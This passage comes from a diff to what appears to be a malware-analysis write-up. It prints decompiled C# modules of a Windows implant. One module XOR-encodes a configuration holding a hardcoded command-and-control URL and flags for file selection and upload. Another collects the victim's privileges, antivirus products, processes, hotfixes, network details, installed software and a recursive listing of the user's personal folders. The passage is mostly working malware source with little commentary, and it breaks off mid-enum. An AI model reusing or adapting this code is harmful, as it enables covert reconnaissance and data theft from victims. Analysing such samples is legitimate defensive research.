@@ -698,6 +698,777 @@ namespace SystemApp
 }
 ```
 
+<h6> The third module gives the functions for encode and decode the data to put in the files, the algorithms are the same as for decrypt the payload (as reuse code). This also has functions for reading and writing files, and saving and reading the configuration. </h6>
+
+```csharp
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Security.Cryptography;
+using SystemApp.Properties;
+namespace SystemApp
+{
+ // Token: 0x02000002 RID: 2
+ internal class Settings
+ {
+  // Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
+  private Settings(){using (MemoryStream memoryStream = new MemoryStream(Settings.DecodeData(Resources.Default))){this.ReadFrom(new BinaryReader(memoryStream));}}
+  // Token: 0x06000002 RID: 2 RVA: 0x0000209C File Offset: 0x0000029C
+  private Settings(BinaryReader bR){this.ReadFrom(bR);}
+  // Token: 0x06000003 RID: 3 RVA: 0x000020AC File Offset: 0x000002AC
+  public static Settings LoadSettings()
+  {
+   Settings settings = new Settings();
+   try{
+    using (MemoryStream memoryStream = new MemoryStream(Settings.DecodeData(System.IO.File.ReadAllBytes(Settings._settingsFilePath)))){
+     return new Settings(new BinaryReader(memoryStream));}}
+   catch{settings.Save();}
+   return settings;
+  }
+  // Token: 0x06000004 RID: 4 RVA: 0x00002114 File Offset: 0x00000314
+  private static byte[] EncodeData(byte[] data)
+  {
+   byte[] array = new byte[data.Length + 32];
+   RandomNumberGenerator randomNumberGenerator = RandomNumberGenerator.Create();
+   byte[] array2 = new byte[32];
+   randomNumberGenerator.GetBytes(array2);
+   Buffer.BlockCopy(array2, 0, array, 0, 32);
+   Buffer.BlockCopy(data, 0, array, 32, data.Length);
+   for (int i = 0; i < data.Length; i++){
+    byte[] array3 = array;
+    int num = i + 32;
+    array3[num] ^= array[i % 32];}
+   return array;
+  }
+  // Token: 0x06000005 RID: 5 RVA: 0x0000217C File Offset: 0x0000037C
+  private static byte[] DecodeData(byte[] data)
+  {
+   byte[] array = new byte[data.Length - 32];
+   Buffer.BlockCopy(data, 32, array, 0, array.Length);
+   for (int i = 0; i < array.Length; i++){
+    byte[] array2 = array;
+    int num = i;
+    array2[num] ^= data[i % 32];}
+   return array;
+  }
+  // Token: 0x06000006 RID: 6 RVA: 0x000021C4 File Offset: 0x000003C4
+  public void Save()
+  {
+   lock (this){
+    try{
+     using (MemoryStream memoryStream = new MemoryStream())
+     {
+      this.WriteTo(new BinaryWriter(memoryStream));
+      System.IO.File.WriteAllBytes(Settings._settingsFilePath, Settings.EncodeData(memoryStream.ToArray()));
+     }}
+    catch (Exception ex){
+     try{System.IO.File.WriteAllText(Path.Combine(this._outputFolder, Path.GetRandomFileName() + ".err"), ex.ToString());}
+     catch
+     {}}}
+  }
+  // Token: 0x06000007 RID: 7 RVA: 0x00002278 File Offset: 0x00000478
+  public void ReadFrom(BinaryReader bR)
+  {
+   if (bR.ReadByte() == 1){
+    Settings._settingsFilePath = Environment.ExpandEnvironmentVariables(bR.ReadString());
+    string directoryName = Path.GetDirectoryName(Settings._settingsFilePath);
+    if (!Directory.Exists(directoryName)){Directory.CreateDirectory(directoryName);}
+    this._outputFolder = Environment.ExpandEnvironmentVariables(bR.ReadString());
+    if (!Directory.Exists(this._outputFolder)){Directory.CreateDirectory(this._outputFolder);}
+    string text = bR.ReadString();
+    if (string.IsNullOrEmpty(text)){this._serverUri = new Uri("https://ap1-acl.net/202/KfzLXf6NisWqPtYOrrQYJfzErkCyS8ib8dz3QSsN/1115/2280/16331af8                                                                                                                                                                                                                                                                                                                                                                                                                                 ".Trim());}
+    else{this._serverUri = new Uri(text);}
+    this._getInterval = bR.ReadInt32();
+    this._postInterval = bR.ReadInt32();
+    this._doSysInfo = bR.ReadBoolean();
+    this._doFileSelection = bR.ReadBoolean();
+    this._doFileUpload = bR.ReadBoolean();
+    int num = bR.ReadInt32();
+    this._selectFileExtensions = new string[num];
+    for (int i = 0; i < num; i++){this._selectFileExtensions[i] = bR.ReadString();}
+    this._maxSelectFileSize = bR.ReadInt32();
+    int num2 = bR.ReadInt32();
+    this._selectedFiles = new List<Settings.File>(num2);
+    for (int j = 0; j < num2; j++){this._selectedFiles.Add(new Settings.File(bR));}
+    int num3 = bR.ReadInt32();
+    this._outputFiles = new List<Settings.File>(num3);
+    for (int k = 0; k < num3; k++){this._outputFiles.Add(new Settings.File(bR));}
+    return;}
+   throw new InvalidDataException();
+  }
+  // Token: 0x06000008 RID: 8 RVA: 0x00002400 File Offset: 0x00000600
+  public void WriteTo(BinaryWriter bW)
+  {
+   bW.Write(1);
+   bW.Write(Settings._settingsFilePath);
+   bW.Write(this._outputFolder);
+   bW.Write(this._serverUri.AbsoluteUri);
+   bW.Write(this._getInterval);
+   bW.Write(this._postInterval);
+   bW.Write(this._doSysInfo);
+   bW.Write(this._doFileSelection);
+   bW.Write(this._doFileUpload);
+   bW.Write(this._selectFileExtensions.Length);
+   foreach (string value in this._selectFileExtensions){bW.Write(value);}
+   bW.Write(this._maxSelectFileSize);
+   bW.Write(this._selectedFiles.Count);
+   foreach (Settings.File file in this._selectedFiles){file.WriteTo(bW);}
+   bW.Write(this._outputFiles.Count);
+   foreach (Settings.File file2 in this._outputFiles){file2.WriteTo(bW);}
+  }
+  // Token: 0x17000001 RID: 1
+  // (get) Token: 0x06000009 RID: 9 RVA: 0x00002558 File Offset: 0x00000758
+  public string OutputFolder{get{return this._outputFolder;}}
+  // Token: 0x17000002 RID: 2
+  // (get) Token: 0x0600000A RID: 10 RVA: 0x00002560 File Offset: 0x00000760
+  // (set) Token: 0x0600000B RID: 11 RVA: 0x00002568 File Offset: 0x00000768
+  public Uri ServerUri
+  {
+   get{return this._serverUri;}
+   set{this._serverUri = value;}
+  }
+  // Token: 0x17000003 RID: 3
+  // (get) Token: 0x0600000C RID: 12 RVA: 0x00002571 File Offset: 0x00000771
+  public int GetInterval{get{return this._getInterval;}}
+  // Token: 0x17000004 RID: 4
+  // (get) Token: 0x0600000D RID: 13 RVA: 0x00002579 File Offset: 0x00000779
+  public int PostInterval{get{return this._postInterval;}}
+  // Token: 0x17000005 RID: 5
+  // (get) Token: 0x0600000E RID: 14 RVA: 0x00002581 File Offset: 0x00000781
+  // (set) Token: 0x0600000F RID: 15 RVA: 0x00002589 File Offset: 0x00000789
+  public bool DoSysInfo
+  {
+   get{return this._doSysInfo;}
+   set{this._doSysInfo = value;}
+  }
+  // Token: 0x17000006 RID: 6
+  // (get) Token: 0x06000010 RID: 16 RVA: 0x00002592 File Offset: 0x00000792
+  // (set) Token: 0x06000011 RID: 17 RVA: 0x0000259A File Offset: 0x0000079A
+  public bool DoFileSelection
+  {
+   get{return this._doFileSelection;}
+   set{this._doFileSelection = value;}
+  }
+  // Token: 0x17000007 RID: 7
+  // (get) Token: 0x06000012 RID: 18 RVA: 0x000025A3 File Offset: 0x000007A3
+  // (set) Token: 0x06000013 RID: 19 RVA: 0x000025AB File Offset: 0x000007AB
+  public bool DoFileUpload
+  {
+   get{return this._doFileUpload;}
+   set{this._doFileUpload = value;}
+  }
+  // Token: 0x17000008 RID: 8
+  // (get) Token: 0x06000014 RID: 20 RVA: 0x000025B4 File Offset: 0x000007B4
+  // (set) Token: 0x06000015 RID: 21 RVA: 0x000025BC File Offset: 0x000007BC
+  public string[] SelectFileExtensions
+  {
+   get{return this._selectFileExtensions;}
+   set{this._selectFileExtensions = value;}
+  }
+  // Token: 0x17000009 RID: 9
+  // (get) Token: 0x06000016 RID: 22 RVA: 0x000025C5 File Offset: 0x000007C5
+  // (set) Token: 0x06000017 RID: 23 RVA: 0x000025CD File Offset: 0x000007CD
+  public int MaxSelectFileSize
+  {
+   get{return this._maxSelectFileSize;}
+   set{this._maxSelectFileSize = value;}
+  }
+  // Token: 0x1700000A RID: 10
+  // (get) Token: 0x06000018 RID: 24 RVA: 0x000025D6 File Offset: 0x000007D6
+  public List<Settings.File> SelectedFiles{get{return this._selectedFiles;}}
+  // Token: 0x1700000B RID: 11
+  // (get) Token: 0x06000019 RID: 25 RVA: 0x000025DE File Offset: 0x000007DE
+  public List<Settings.File> OutputFiles{get{return this._outputFiles;}}
+  // Token: 0x04000001 RID: 1
+  private const string SERVER_URI = "https://ap1-acl.net/202/KfzLXf6NisWqPtYOrrQYJfzErkCyS8ib8dz3QSsN/1115/2280/16331af8                                                                                                                                                                                                                                                                                                                                                                                                                                 ";
+  // Token: 0x04000002 RID: 2
+  private static string _settingsFilePath;
+  // Token: 0x04000003 RID: 3
+  private string _outputFolder;
+  // Token: 0x04000004 RID: 4
+  private Uri _serverUri;
+  // Token: 0x04000005 RID: 5
+  private int _getInterval;
+  // Token: 0x04000006 RID: 6
+  private int _postInterval;
+  // Token: 0x04000007 RID: 7
+  private bool _doSysInfo;
+  // Token: 0x04000008 RID: 8
+  private bool _doFileSelection;
+  // Token: 0x04000009 RID: 9
+  private bool _doFileUpload;
+  // Token: 0x0400000A RID: 10
+  private string[] _selectFileExtensions;
+  // Token: 0x0400000B RID: 11
+  private int _maxSelectFileSize;
+  // Token: 0x0400000C RID: 12
+  private List<Settings.File> _selectedFiles;
+  // Token: 0x0400000D RID: 13
+  private List<Settings.File> _outputFiles;
+  // Token: 0x02000007 RID: 7
+  public class File
+  {
+   // Token: 0x0600003B RID: 59 RVA: 0x0000441B File Offset: 0x0000261B
+   public File(string filePath){this._filePath = filePath;}
+   // Token: 0x0600003C RID: 60 RVA: 0x0000442A File Offset: 0x0000262A
+   public File(BinaryReader bR){
+    this._filePath = bR.ReadString();
+    this._sentOffset = bR.ReadInt64();
+    this._complete = bR.ReadBoolean();}
+   // Token: 0x0600003D RID: 61 RVA: 0x00004456 File Offset: 0x00002656
+   public void WriteTo(BinaryWriter bW){
+    bW.Write(this._filePath);
+    bW.Write(this._sentOffset);
+    bW.Write(this._complete);}
+   // Token: 0x0600003E RID: 62 RVA: 0x0000447C File Offset: 0x0000267C
+   public override bool Equals(object obj){
+    if (obj == null){return false;}
+    if (obj == this){return true;}
+    Settings.File file = obj as Settings.File;
+    return file != null && this._filePath == file._filePath;}
+   // Token: 0x0600003F RID: 63 RVA: 0x000044B1 File Offset: 0x000026B1
+   public override int GetHashCode(){return this._filePath.GetHashCode();}
+   // Token: 0x17000010 RID: 16
+   // (get) Token: 0x06000040 RID: 64 RVA: 0x000044BE File Offset: 0x000026BE
+   public string FilePath{get{return this._filePath;}}
+   // Token: 0x17000011 RID: 17
+   // (get) Token: 0x06000041 RID: 65 RVA: 0x000044C6 File Offset: 0x000026C6
+   // (set) Token: 0x06000042 RID: 66 RVA: 0x000044CE File Offset: 0x000026CE
+   public long SentOffset{
+    get{return this._sentOffset;}
+    set{this._sentOffset = value;}}
+   // Token: 0x17000012 RID: 18
+   // (get) Token: 0x06000043 RID: 67 RVA: 0x000044D7 File Offset: 0x000026D7
+   // (set) Token: 0x06000044 RID: 68 RVA: 0x000044DF File Offset: 0x000026DF
+   public bool Complete{
+    get{return this._complete;}
+    set{this._complete = value;}}
+   // Token: 0x04000021 RID: 33
+   private string _filePath;
+   // Token: 0x04000022 RID: 34
+   private long _sentOffset;
+   // Token: 0x04000023 RID: 35
+   private bool _complete;
+  }
+ }
+}
+```
+<h6> The last module give all the functions used for parsed the information about system, users, privileges, security products, HotFix, network settings...</h6>
+
+```csharp
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Management;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Text;
+using Microsoft.Win32;
+using Newtonsoft.Json;
+namespace SystemApp
+{
+	// Token: 0x02000005 RID: 5
+	[ComVisible(true)]
+	internal class SysInfo
+	{
+		// Token: 0x06000028 RID: 40
+		[DllImport("advapi32.dll", SetLastError = true)]
+		private static extern bool GetTokenInformation(IntPtr tokenHandle, SysInfo.TokenInformationClass tokenInformationClass, IntPtr tokenInformation, int tokenInformationLength, out int returnLength);
+		// Token: 0x06000029 RID: 41
+		[DllImport("shell32.dll", CharSet = CharSet.Auto)]
+		private static extern int SHGetKnownFolderPath(ref Guid id, int flags, IntPtr token, out IntPtr path);
+		// Token: 0x0600002A RID: 42 RVA: 0x0000353C File Offset: 0x0000173C
+		private static void WriteWmi(JsonTextWriter jsonWriter, string queryTable, string scope, string[] columns)
+		{
+			jsonWriter.WriteStartArray();
+			try
+			{
+				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher(scope, "SELECT * FROM " + queryTable).Get())
+				{
+					ManagementObject managementObject = (ManagementObject)managementBaseObject;
+					jsonWriter.WriteStartObject();
+					foreach (string text in columns)
+					{
+						jsonWriter.WritePropertyName(text);
+						try
+						{
+							if (text != null && text == "ProcessOwner")
+							{
+								string[] array = new string[]
+								{
+									string.Empty,
+									string.Empty
+								};
+								ManagementObject managementObject2 = managementObject;
+								string methodName = "GetOwner";
+								object[] args = array;
+								if (Convert.ToInt32(managementObject2.InvokeMethod(methodName, args)) == 0){jsonWriter.WriteValue(array[1] + "\\" + array[0]);}
+								else{jsonWriter.WriteValue("NoOwner");}
+							}
+							else{jsonWriter.WriteValue(managementObject[text]);}
+						}
+						catch{jsonWriter.WriteValue("nota");}
+					}
+					jsonWriter.WriteEndObject();
+				}
+			}
+			catch (Exception ex)
+			{
+				jsonWriter.WriteStartObject();
+				jsonWriter.WritePropertyName("error");
+				jsonWriter.WriteValue(ex.ToString());
+				jsonWriter.WriteEndObject();
+			}
+			jsonWriter.WriteEndArray();
+		}
+		// Token: 0x0600002B RID: 43 RVA: 0x000036A4 File Offset: 0x000018A4
+		private static string GetPath(Guid guid)
+		{
+			IntPtr ptr;
+			if (SysInfo.SHGetKnownFolderPath(ref guid, 0, IntPtr.Zero, out ptr) == 0)
+			{
+				string result = Marshal.PtrToStringUni(ptr);
+				Marshal.FreeCoTaskMem(ptr);
+				return result;
+			}
+			return null;
+		}
+		// Token: 0x0600002C RID: 44 RVA: 0x000036D0 File Offset: 0x000018D0
+		private static void GetAllFiles(string path, List<string> files)
+		{
+			try
+			{
+				files.AddRange(Directory.GetFiles(path));
+				string[] directories = Directory.GetDirectories(path);
+				for (int i = 0; i < directories.Length; i++){SysInfo.GetAllFiles(directories[i], files);}
+			}
+			catch{}
+		}
+		// Token: 0x0600002D RID: 45 RVA: 0x0000371C File Offset: 0x0000191C
+		private static void WritePrivileges(JsonTextWriter jsonWriter)
+		{
+			jsonWriter.WritePropertyName("privileges");
+			jsonWriter.WriteStartObject();
+			try
+			{
+				bool flag = false;
+				bool flag2 = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
+				if (flag2){flag = true;}
+				else if (Environment.OSVersion.Version.Major >= 6)
+				{
+					int num = Marshal.SizeOf(typeof(int));
+					IntPtr intPtr = Marshal.AllocHGlobal(num);
+					try
+					{
+						if (!SysInfo.GetTokenInformation(WindowsIdentity.GetCurrent().Token, SysInfo.TokenInformationClass.TokenElevationType, intPtr, num, out num))
+						{
+							throw Marshal.GetExceptionForHR(Marshal.GetHRForLastWin32Error());
+						}
+						SysInfo.TokenElevationType tokenElevationType = (SysInfo.TokenElevationType)Marshal.ReadInt32(intPtr);
+						if (tokenElevationType != SysInfo.TokenElevationType.TokenElevationTypeDefault && tokenElevationType - SysInfo.TokenElevationType.TokenElevationTypeFull <= 1){flag = true;}
+					}
+					finally{if (intPtr != IntPtr.Zero){Marshal.FreeHGlobal(intPtr);}}
+				}
+				jsonWriter.WritePropertyName("IsInAdminGroup");
+				jsonWriter.WriteValue(flag ? "Yes" : "No");
+				jsonWriter.WritePropertyName("IsAdminPrivilege");
+				jsonWriter.WriteValue(flag2 ? "Yes" : "No");
+			}
+			catch (Exception ex)
+			{
+				jsonWriter.WritePropertyName("error");
+				jsonWriter.WriteValue(ex.ToString());
+			}
+			jsonWriter.WriteEndObject();
+		}
+		// Token: 0x0600002E RID: 46 RVA: 0x00003850 File Offset: 0x00001A50
+		private static void WriteSysInfo(JsonTextWriter jsonWriter)
+		{
+			jsonWriter.WritePropertyName("sysInfo");
+			jsonWriter.WriteStartObject();
+			jsonWriter.WritePropertyName("userAccount");
+			SysInfo.WriteWmi(jsonWriter, "Win32_userAccount", "root\\cimv2", new string[]
+			{
+				"name"
+			});
+			jsonWriter.WritePropertyName("computerSystem");
+			SysInfo.WriteWmi(jsonWriter, "Win32_computerSystem", "root\\cimv2", new string[]
+			{
+				"Caption",
+				"UserName",
+				"Manufacturer",
+				"Model",
+				"PrimaryOwnerName",
+				"TotalPhysicalMemory"
+			});
+			jsonWriter.WritePropertyName("antiVirusProduct");
+			SysInfo.WriteWmi(jsonWriter, "antiVirusProduct", "root\\SecurityCenter2", new string[]
+			{
+				"displayName",
+				"ProductState",
+				"TimeStamp"
+			});
+			jsonWriter.WritePropertyName("antiSpywareProduct");
+			SysInfo.WriteWmi(jsonWriter, "antiSpywareProduct", "root\\SecurityCenter2", new string[]
+			{
+				"displayName",
+				"ProductState",
+				"TimeStamp"
+			});
+			jsonWriter.WritePropertyName("process");
+			SysInfo.WriteWmi(jsonWriter, "Win32_process", "root\\cimv2", new string[]
+			{
+				"Name",
+				"CommandLine",
+				"ProcessOwner"
+			});
+			jsonWriter.WritePropertyName("processor");
+			SysInfo.WriteWmi(jsonWriter, "Win32_processor", "root\\cimv2", new string[]
+			{
+				"Caption",
+				"Name",
+				"Architecture",
+				"NumberOfCores",
+				"NumberOfLogicalProcessors",
+				"ProcessorId",
+				"CurrentClockSpeed",
+				"MaximumClockSpeed",
+				"DataWidth"
+			});
+			jsonWriter.WritePropertyName("operatingSystem");
+			SysInfo.WriteWmi(jsonWriter, "Win32_operatingSystem", "root\\cimv2", new string[]
+			{
+				"Caption",
+				"version",
+				"RegisteredUser",
+				"BuildNumber",
+				"ServicePackMajorVersion",
+				"ServicePackMinorVersion",
+				"OSArchitecture",
+				"OSProductSuite"
+			});
+			jsonWriter.WritePropertyName("timeZone");
+			SysInfo.WriteWmi(jsonWriter, "Win32_timeZone", "root\\cimv2", new string[]
+			{
+				"Caption",
+				"description",
+				"StandardName"
+			});
+			jsonWriter.WritePropertyName("quickFixEngineering");
+			SysInfo.WriteWmi(jsonWriter, "Win32_quickFixEngineering", "root\\cimv2", new string[]
+			{
+				"HotFixID",
+				"Description",
+				"InstalledOn"
+			});
+			jsonWriter.WritePropertyName("network");
+			jsonWriter.WriteStartArray();
+			try
+			{
+				foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
+				{
+					jsonWriter.WriteStartObject();
+					jsonWriter.WritePropertyName("name");
+					jsonWriter.WriteValue(networkInterface.Name);
+					jsonWriter.WritePropertyName("description");
+					jsonWriter.WriteValue(networkInterface.Description);
+					jsonWriter.WritePropertyName("networkInterfaceType");
+					jsonWriter.WriteValue(networkInterface.NetworkInterfaceType.ToString());
+					jsonWriter.WritePropertyName("operationalStatus");
+					jsonWriter.WriteValue(networkInterface.OperationalStatus.ToString());
+					jsonWriter.WritePropertyName("speed");
+					jsonWriter.WriteValue(networkInterface.Speed);
+					jsonWriter.WritePropertyName("macAddress");
+					jsonWriter.WriteValue(BitConverter.ToString(networkInterface.GetPhysicalAddress().GetAddressBytes()));
+					IPInterfaceProperties ipproperties = networkInterface.GetIPProperties();
+					if (networkInterface.Supports(NetworkInterfaceComponent.IPv4))
+					{
+						jsonWriter.WritePropertyName("isDhcpEnabled");
+						jsonWriter.WriteValue(ipproperties.GetIPv4Properties().IsDhcpEnabled);
+					}
+					jsonWriter.WritePropertyName("dhcpServers");
+					jsonWriter.WriteStartArray();
+					foreach (IPAddress ipaddress in ipproperties.DhcpServerAddresses){jsonWriter.WriteValue(ipaddress.ToString());}
+					jsonWriter.WriteEndArray();
+					jsonWriter.WritePropertyName("dnsAddresses");
+					jsonWriter.WriteStartArray();
+					foreach (IPAddress ipaddress2 in ipproperties.DnsAddresses){jsonWriter.WriteValue(ipaddress2.ToString());}
+					jsonWriter.WriteEndArray();
+					jsonWriter.WritePropertyName("winsAddresses");
+					jsonWriter.WriteStartArray();
+					foreach (IPAddress ipaddress3 in ipproperties.WinsServersAddresses){jsonWriter.WriteValue(ipaddress3.ToString());}
+					jsonWriter.WriteEndArray();
+					jsonWriter.WritePropertyName("gatewayAddresses");
+					jsonWriter.WriteStartArray();
+					foreach (GatewayIPAddressInformation gatewayIPAddressInformation in ipproperties.GatewayAddresses){jsonWriter.WriteValue(gatewayIPAddressInformation.Address.ToString());}
+					jsonWriter.WriteEndArray();
+					jsonWriter.WritePropertyName("ipAddresses");
+					jsonWriter.WriteStartArray();
+					foreach (UnicastIPAddressInformation unicastIPAddressInformation in ipproperties.UnicastAddresses)
+					{
+						jsonWriter.WriteStartObject();
+						jsonWriter.WritePropertyName("address");
+						jsonWriter.WriteValue(unicastIPAddressInformation.Address.ToString());
+						AddressFamily addressFamily = unicastIPAddressInformation.Address.AddressFamily;
+						if (addressFamily != AddressFamily.InterNetwork)
+						{
+							if (addressFamily == AddressFamily.InterNetworkV6)
+							{
+								jsonWriter.WritePropertyName("prefixOrigin");
+								jsonWriter.WriteValue(unicastIPAddressInformation.PrefixOrigin.ToString());
+							}
+						}
+						else
+						{
+							jsonWriter.WritePropertyName("subnetMask");
+							jsonWriter.WriteValue(unicastIPAddressInformation.IPv4Mask.ToString());
+						}
+						jsonWriter.WriteEndObject();
+					}
+					jsonWriter.WriteEndArray();
+					jsonWriter.WriteEndObject();
+				}
+			}
+			catch (Exception ex)
+			{
+				jsonWriter.WriteStartObject();
+				jsonWriter.WritePropertyName("error");
+				jsonWriter.WriteValue(ex.ToString());
+				jsonWriter.WriteEndObject();
+			}
+			jsonWriter.WriteEndArray();
+			jsonWriter.WriteEndObject();
+		}
+		// Token: 0x0600002F RID: 47 RVA: 0x00003EDC File Offset: 0x000020DC
+		private static void WriteDirectoryListing(JsonTextWriter jsonWriter)
+		{
+			jsonWriter.WritePropertyName("dirList");
+			jsonWriter.WriteStartArray();
+			try
+			{
+				foreach (string text in new List<string>
+				{
+					SysInfo.GetPath(SysInfo.Desktop),
+					SysInfo.GetPath(SysInfo.Documents),
+					SysInfo.GetPath(SysInfo.Downloads),
+					SysInfo.GetPath(SysInfo.Contacts)
+				})
+				{
+					jsonWriter.WriteStartObject();
+					jsonWriter.WritePropertyName(text);
+					jsonWriter.WriteStartArray();
+					if (Directory.Exists(text))
+					{
+						List<string> list = new List<string>();
+						SysInfo.GetAllFiles(text, list);
+						foreach (string text2 in list){jsonWriter.WriteValue(text2);}
+					}
+					jsonWriter.WriteEndArray();
+					jsonWriter.WriteEndObject();
+				}
+			}
+			catch (Exception ex){
+				jsonWriter.WriteStartObject();
+				jsonWriter.WritePropertyName("error");
+				jsonWriter.WriteValue(ex.ToString());
+				jsonWriter.WriteEndObject();
+			}
+			jsonWriter.WriteEndArray();
+		}
+		// Token: 0x06000030 RID: 48 RVA: 0x00004028 File Offset: 0x00002228
+		private static void WriteDriveInfo(JsonTextWriter jsonWriter)
+		{
+			jsonWriter.WritePropertyName("driveInfo");
+			jsonWriter.WriteStartArray();
+			try
+			{
+				foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
+				{
+					jsonWriter.WriteStartObject();
+					jsonWriter.WritePropertyName("Path");
+					jsonWriter.WriteValue(driveInfo.Name);
+					jsonWriter.WritePropertyName("type");
+					jsonWriter.WriteValue(driveInfo.DriveType.ToString());
+					jsonWriter.WritePropertyName("isReady");
+					jsonWriter.WriteValue(driveInfo.IsReady);
+					if (driveInfo.IsReady)
+					{
+						jsonWriter.WritePropertyName("TotalSize");
+						jsonWriter.WriteValue(driveInfo.TotalSize);
+						jsonWriter.WritePropertyName("FreeSpace");
+						jsonWriter.WriteValue(driveInfo.TotalFreeSpace);
+						jsonWriter.WritePropertyName("availableFreeSpace");
+						jsonWriter.WriteValue(driveInfo.AvailableFreeSpace);
+						jsonWriter.WritePropertyName("driveFormat");
+						jsonWriter.WriteValue(driveInfo.DriveFormat);
+						jsonWriter.WritePropertyName("volumeLabel");
+						jsonWriter.WriteValue(driveInfo.VolumeLabel);
+					}
+					jsonWriter.WriteEndObject();
+				}
+			}
+			catch (Exception ex)
+			{
+				jsonWriter.WriteStartObject();
+				jsonWriter.WritePropertyName("error");
+				jsonWriter.WriteValue(ex.ToString());
+				jsonWriter.WriteEndObject();
+			}
+			jsonWriter.WriteEndArray();
+		}
+		// Token: 0x06000031 RID: 49 RVA: 0x00004180 File Offset: 0x00002380
+		private static void WriteInstalledApps(JsonTextWriter jsonWriter)
+		{
+			jsonWriter.WritePropertyName("installedApps");
+			jsonWriter.WriteStartArray();
+			try
+			{
+				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall"))
+				{
+					foreach (string name in registryKey.GetSubKeyNames())
+					{
+						using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
+						{
+							if (registryKey2 != null)
+							{
+								string text = registryKey2.GetValue("DisplayName") as string;
+								if (text != null)
+								{
+									jsonWriter.WriteStartObject();
+									jsonWriter.WritePropertyName("Name");
+									jsonWriter.WriteValue(text);
+									jsonWriter.WritePropertyName("Version");
+									jsonWriter.WriteValue(registryKey2.GetValue("DisplayVersion"));
+									jsonWriter.WriteEndObject();
+								}
+							}
+						}
+					}
+				}
+			}
+			catch (Exception ex)
+			{
+				jsonWriter.WriteStartObject();
+				jsonWriter.WritePropertyName("error");
+				jsonWriter.WriteValue(ex.ToString());
+				jsonWriter.WriteEndObject();
+			}
+			jsonWriter.WriteEndArray();
+		}
+		// Token: 0x06000032 RID: 50 RVA: 0x0000429C File Offset: 0x0000249C
+		public static void WriteTo(Stream s)
+		{
+			JsonTextWriter jsonTextWriter = new JsonTextWriter(new StreamWriter(s, Encoding.UTF8));
+			jsonTextWriter.WriteStartObject();
+			SysInfo.WritePrivileges(jsonTextWriter);
+			SysInfo.WriteSysInfo(jsonTextWriter);
+			SysInfo.WriteDirectoryListing(jsonTextWriter);
+			SysInfo.WriteDriveInfo(jsonTextWriter);
+			SysInfo.WriteInstalledApps(jsonTextWriter);
+			jsonTextWriter.WriteEndObject();
+			jsonTextWriter.Flush();
+		}
+		// Token: 0x04000014 RID: 20
+		private static readonly Guid Contacts = new Guid("{56784854-C6CB-462B-8169-88E350ACB882}");
+		// Token: 0x04000015 RID: 21
+		private static readonly Guid Desktop = new Guid("{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}");
+		// Token: 0x04000016 RID: 22
+		private static readonly Guid Documents = new Guid("{FDD39AD0-238F-46AF-ADB4-6C85480369C7}");
+		// Token: 0x04000017 RID: 23
+		private static readonly Guid Downloads = new Guid("{374DE290-123F-4565-9164-39C4925E467B}");
+		// Token: 0x04000018 RID: 24
+		private static readonly Guid Favorites = new Guid("{1777F761-68AD-4D8A-87BD-30B759FA33DD}");
+		// Token: 0x04000019 RID: 25
+		private static readonly Guid Links = new Guid("{BFB9D5E0-C6A9-404C-B2B2-AE6DB6AF4968}");
+		// Token: 0x0400001A RID: 26
+		private static readonly Guid Music = new Guid("{4BD8D571-6D19-48D3-BE97-422220080E43}");
+		// Token: 0x0400001B RID: 27
+		private static readonly Guid Pictures = new Guid("{33E28130-4E1E-4676-835A-98395C3BC3BB}");
+		// Token: 0x0400001C RID: 28
+		private static readonly Guid SavedGames = new Guid("{4C5C32FF-BB9D-43B0-B5B4-2D72E54EAAA4}");
+		// Token: 0x0400001D RID: 29
+		private static readonly Guid SavedSearches = new Guid("{7D1D3A04-DEBB-4115-95CF-2F29DA2920DA}");
+		// Token: 0x0400001E RID: 30
+		private static readonly Guid Videos = new Guid("{18989B1D-99B5-455B-841C-AB7C74E4DDFC}");
+		// Token: 0x0200000C RID: 12
+		private enum TokenInformationClass
+		{
+			// Token: 0x0400002B RID: 43
+			TokenUser = 1,
+			// Token: 0x0400002C RID: 44
+			TokenGroups,
+			// Token: 0x0400002D RID: 45
+			TokenPrivileges,
+			// Token: 0x0400002E RID: 46
+			TokenOwner,
+			// Token: 0x0400002F RID: 47
+			TokenPrimaryGroup,
+			// Token: 0x04000030 RID: 48
+			TokenDefaultDacl,
+			// Token: 0x04000031 RID: 49
+			TokenSource,
+			// Token: 0x04000032 RID: 50
+			TokenType,
+			// Token: 0x04000033 RID: 51
+			TokenImpersonationLevel,
+			// Token: 0x04000034 RID: 52
+			TokenStatistics,
+			// Token: 0x04000035 RID: 53
+			TokenRestrictedSids,
+			// Token: 0x04000036 RID: 54
+			TokenSessionId,
+			// Token: 0x04000037 RID: 55
+			TokenGroupsAndPrivileges,
+			// Token: 0x04000038 RID: 56
+			TokenSessionReference,
+			// Token: 0x04000039 RID: 57
+			TokenSandBoxInert,
+			// Token: 0x0400003A RID: 58
+			TokenAuditPolicy,
+			// Token: 0x0400003B RID: 59
+			TokenOrigin,
+			// Token: 0x0400003C RID: 60
+			TokenElevationType,
+			// Token: 0x0400003D RID: 61
+			TokenLinkedToken,
+			// Token: 0x0400003E RID: 62
+			TokenElevation,
+			// Token: 0x0400003F RID: 63
+			TokenHasRestrictions,
+			// Token: 0x04000040 RID: 64
+			TokenAccessInformation,
+			// Token: 0x04000041 RID: 65
+			TokenVirtualizationAllowed,
+			// Token: 0x04000042 RID: 66
+			TokenVirtualizationEnabled,
+			// Token: 0x04000043 RID: 67
+			TokenIntegrityLevel,
+			// Token: 0x04000044 RID: 68
+			TokenUiAccess,
+			// Token: 0x04000045 RID: 69
+			TokenMandatoryPolicy,
+			// Token: 0x04000046 RID: 70
+			TokenLogonSid,
+			// Token: 0x04000047 RID: 71
+			MaxTokenInfoClass
+		}
+		// Token: 0x0200000D RID: 13
+		private enum TokenElevationType
+		{
+			// Token: 0x04000049 RID: 73
+			TokenElevationTypeDefault = 1,
+			// Token: 0x0400004A RID: 74
